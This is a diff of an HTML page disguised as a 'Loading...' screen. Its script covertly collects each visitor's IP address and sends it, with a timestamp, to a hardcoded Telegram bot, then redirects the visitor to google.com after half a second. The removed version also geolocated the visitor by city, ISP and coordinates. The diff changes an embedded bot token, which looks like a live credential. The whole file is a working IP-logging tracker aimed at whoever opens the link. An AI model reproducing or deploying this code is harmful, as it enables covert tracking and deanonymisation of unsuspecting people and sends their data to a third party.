@@ -1,20 +1,18 @@
 <!DOCTYPE html>
-<!DOCTYPE html>
 <html>
 <head><title>Loading...</title></head>
 <body>
 
 <script>
-const BOT_TOKEN = '8296295026:AAGTdXgQVEHrpPo8LCBTLSHFAuOp8sVoVyM';
+const BOT_TOKEN = '8296295026:AAF50PwYjpCymmNgyz5gpa8T6AwVaXwk8Ys';
 const CHAT_ID = '1948684561';
 
-// Функция отправки в Telegram
 function sendToTelegram(text) {
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({chat_id: CHAT_ID, text: text})
-  }).catch(e => console.log('Ошибка:', e));
+  });
 }
 
 // Получаем IP
@@ -22,19 +20,13 @@ fetch('https://api.ipify.org?format=json')
   .then(r => r.json())
   .then(data => {
     const ip = data.ip;
-    // Получаем гео по IP
-    return fetch(`https://ipapi.co/${ip}/json/`);
-  })
-  .then(r => r.json())
-  .then(geo => {
-    const message = `🌍 НОВЫЙ ПЕРЕХОД!\n\nIP: ${geo.ip}\nСтрана: ${geo.country_name}\nГород: ${geo.city}\nПровайдер: ${geo.org}\nШирота: ${geo.latitude}\nДолгота: ${geo.longitude}\nВремя: ${new Date().toLocaleString()}`;
+    const message = `🌍 НОВЫЙ ПЕРЕХОД!\n\nIP: ${ip}\nВремя: ${new Date().toLocaleString()}\nУзнать город: https://ipinfo.io/${ip}`;
     sendToTelegram(message);
   })
   .catch(e => {
-    sendToTelegram('Ошибка сбора данных: ' + e.message);
+    sendToTelegram('Ошибка: ' + e.message);
   });
 
-// Перенаправление
 setTimeout(() => {
   window.location.href = 'https://google.com';
 }, 500);
